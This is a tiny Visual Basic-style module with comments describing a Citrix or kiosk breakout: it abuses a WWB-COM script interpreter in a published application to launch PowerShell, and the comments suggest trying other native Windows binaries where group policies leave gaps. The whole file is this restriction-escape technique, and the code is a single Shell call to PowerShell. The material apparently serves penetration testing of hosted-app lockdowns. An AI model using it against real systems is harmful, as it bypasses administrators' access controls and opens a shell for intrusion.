Option Explicit

Public Module Module1

    'Secnario for this to launch an application abusing script interpreters on presented apps.
    'For example, if a Citrix ADC hosts an app with a WWB-COM basic inerpreter, 
    'If proper GPOs/restrictions are not set this may launch PowerShell, CMD, Task Manager. 
    'Since GPOs may vary and have different gaps, use this to try different LotL native windows binaries.


    Sub Main
        
Shell "PowerShell.exe", vbNormalFocus 


    End Sub
    
End Module
